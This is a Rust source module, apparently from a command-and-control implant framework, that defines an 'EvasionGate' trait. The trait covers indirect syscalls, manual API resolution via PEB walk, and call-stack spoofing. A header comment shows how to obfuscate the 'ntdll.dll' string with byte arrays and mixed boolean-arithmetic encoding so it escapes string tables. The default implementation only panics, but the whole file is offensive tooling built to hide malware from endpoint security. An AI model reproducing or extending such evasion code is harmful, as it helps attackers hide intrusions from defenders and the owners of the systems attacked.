// __NAME__ Agent — Evasion Gate Abstraction (Rust)
//
// The `EvasionGate` trait defines the contract for pluggable syscall
// dispatch, manual API resolution, and call-stack spoofing.
//
// The generated `DefaultGate` panics on every call — replace it with
// your own implementation before the agent performs any OS interaction.
//
// ─── Obfuscated string helper ──────────────────────────────────────────────────
//
// Use byte-array construction + MBA (Mixed Boolean-Arithmetic) salt instead of
// string literals:
//
//   fn ntdll_name() -> String {
//       let salt: u8 = 0x37;
//       let enc: [u8; 9] = [0x59,0x43,0x53,0x5b,0x5b,0x19,0x53,0x5b,0x5b];
//       enc.iter().map(|&b| (b.wrapping_add(salt)).wrapping_sub(2u8.wrapping_mul(b & salt)) as char).collect()
//       // MBA: a⊕b = (a+b) − 2(a∧b)
//   }
//
// Or simple char-array (no XOR, still avoids string table):
//
//   let ntdll: String = ['n','t','d','l','l','.','d','l','l'].iter().collect();
//

mod default;
#[allow(unused_imports)]
pub use default::DefaultGate;

/// Gate is the single entry point for all OS-level evasion primitives.
///
/// Implement this trait to provide:
/// - Indirect syscall dispatch (e.g. RecycleGate, HellsGate, SysWhispers)
/// - Manual API resolution without LoadLibrary/GetProcAddress (PEB walk)
/// - Optionally spoofed call stacks (e.g. Draugr)
/// - Direct function-pointer invocation through a clean trampoline
pub trait EvasionGate {
    /// One-time setup: SSN enumeration, gadget discovery, spoof context, etc.
    fn init(&mut self) -> Result<(), String>;

    /// Raw syscall dispatch by number (SSN on Windows, syscall number on Linux/Darwin).
    fn syscall(&self, num: u16, args: &[usize]) -> Result<u32, String>;

    /// Manually resolve a function address from module + export name.
    fn resolve_fn(&self, module: &str, function: &str) -> Result<usize, String>;

    /// Invoke an arbitrary function pointer with the given arguments.
    fn call(&self, func: usize, args: &[usize]) -> Result<usize, String>;

    /// Release any resources acquired during init.
    fn close(&mut self);
}
